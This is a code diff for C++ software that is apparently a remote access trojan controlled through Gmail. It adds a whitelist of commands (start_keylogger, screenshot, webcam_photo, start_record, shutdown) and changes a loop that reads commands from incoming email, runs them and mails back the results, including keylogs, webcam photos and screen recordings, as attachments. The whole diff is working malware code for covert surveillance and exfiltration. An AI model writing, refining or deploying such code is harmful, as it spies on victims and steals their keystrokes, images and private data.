@@ -101,6 +101,24 @@ bool sendEmailWithAttachment(const std::string& subject, const std::string& body
     return true;
 }
 
+bool isValidCommand(const std::string& cmd)
+{
+    static const std::set<std::string> validCommands = {
+        "help", "list_services", "start ", "stop ", "list_apps",
+        "start_keylogger", "stop_keylogger", "screenshot", "webcam_photo",
+        "restart", "shutdown", "start_record", "stop_record", "gmail_server"
+    };
+
+    for (const auto& validCmd : validCommands)
+    {
+        if (cmd == validCmd || cmd.rfind(validCmd, 0) == 0) // check prefix
+        {
+            return true;
+        }
+    }
+    return false;
+}
+
 std::string executeCommand(const std::string& cmd)
 {
     if (cmd == "help")
@@ -122,10 +140,9 @@ std::string executeCommand(const std::string& cmd)
     }
     else if (cmd == "list_services")
     {
-        std::string content = listProcesses();
-        std::string filename = fs::current_path().string() + "/process_list.txt";
+        std::string filename = fs::current_path().string() + "\\process_list.txt";
         std::ofstream out(filename);
-        out << content;
+        out << listProcesses();
         out.close();
         return filename;
     }
@@ -141,12 +158,17 @@ std::string executeCommand(const std::string& cmd)
     }
     else if (cmd == "list_apps")
     {
-        return listUserApps();
+        std::string filename = fs::current_path().string() + "\\user_apps.txt";
+        std::ofstream out(filename);
+        out << listUserApps();
+        out.close();
+        return filename;
     }
     else if (cmd == "start_keylogger")
     {
+        std::string filename = fs::current_path().string() + "\\keylog.txt";
         startKeylogger();
-        return "Keylogger started.";
+        return "Keylogger started. Logs will be saved to: " + filename;
     }
     else if (cmd == "stop_keylogger")
     {
@@ -160,7 +182,7 @@ std::string executeCommand(const std::string& cmd)
     }
     else if (cmd == "webcam_photo")
     {
-        std::string filename = fs::current_path().string() + "/webcam_photo.jpg";
+        std::string filename = fs::current_path().string() + "\\webcam_photo.jpg";
         return captureWebcamPhoto(filename) ? filename : "Failed to capture webcam photo.";
     }
     else if (cmd == "restart")
@@ -177,7 +199,7 @@ std::string executeCommand(const std::string& cmd)
     {
         if (!isRecording())
         {
-            std::string filename = fs::current_path().string() + "/screen_recording.avi";
+            std::string filename = fs::current_path().string() + "\\screen_recording.avi";
             startScreenRecording(filename);
             return filename;
         }
@@ -207,30 +229,32 @@ void startGmailControlLoop()
             continue;
         }
 
+        static std::string last_cmd = "";
+
         std::string cmd = readLastEmailCommand();
-        if (!cmd.empty())
+        if (!cmd.empty() && cmd != last_cmd && isValidCommand(cmd))
         {
+            last_cmd = cmd;
             std::string response = executeCommand(cmd);
 
             auto ends_with = [](const std::string& str, const std::string& suffix) {
                 return str.size() >= suffix.size() &&
                        str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0;
             };
-
-            if (ends_with(response, ".png") || ends_with(response, ".jpg") || ends_with(response, ".avi") || ends_with(response, ".txt"))
+            // Check if response is a file path
+            if (ends_with(response, ".txt") || ends_with(response, ".png") || ends_with(response, ".jpg") || ends_with(response, ".avi"))
             {
-                std::string filepath = exe_dir + response;
-                if (!fs::exists(filepath)) {
-                    std::cerr << "Attachment not found: " << filepath << std::endl;
-                    sendEmail("Command Result", "Result: " + response + "\n(Attachment file missing: " + filepath + ")");
-                } else {
-                    sendEmailWithAttachment("Command Result", "Result of command: " + cmd, filepath);
+                if (!sendEmailWithAttachment("Command Response", "See attached file for details.", response))
+                {
+                    std::cerr << "[Gmail] Failed to send email with attachment." << std::endl;
                 }
             }
-
             else
             {
-                sendEmail("Command Result", response);
+                if (!sendEmail("Command Response", response))
+                {
+                    std::cerr << "[Gmail] Failed to send email." << std::endl;
+                }
             }
         }
 
